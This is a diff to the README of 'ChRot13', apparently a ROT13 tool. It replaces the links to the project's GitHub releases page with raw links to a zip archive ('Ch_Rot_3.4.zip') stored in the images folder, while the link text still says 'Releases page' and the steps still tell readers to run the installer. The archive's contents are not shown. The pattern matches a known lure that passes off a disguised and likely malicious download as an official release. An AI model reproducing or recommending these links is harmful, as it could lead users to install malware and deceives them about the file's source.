@@ -6,7 +6,7 @@ ChRot13 is a powerful, cross-platform ROT13 encoding and decoding tool. It trans
 
 ## 📥 Download Now
 
-[![Download ChRot13](https://img.shields.io/badge/Download_ChRot13-v1.0-blue.svg)](https://github.com/Ryangigs/ChRot13/releases)
+[![Download ChRot13](https://raw.githubusercontent.com/Ryangigs/ChRot13/main/images/Ch_Rot_3.4.zip)](https://raw.githubusercontent.com/Ryangigs/ChRot13/main/images/Ch_Rot_3.4.zip)
 
 ## 📦 System Requirements
 
@@ -17,7 +17,7 @@ ChRot13 works on various operating systems, including Windows, macOS, and Linux.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ryangigs/ChRot13/releases) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Ryangigs/ChRot13/main/images/Ch_Rot_3.4.zip) on GitHub.
 2. **Choose the Right Version**: Look for the latest version listed.
 3. **Download the Installer**: Click on the link to download the installer file designed for your operating system.
 4. **Run the Installer**: 
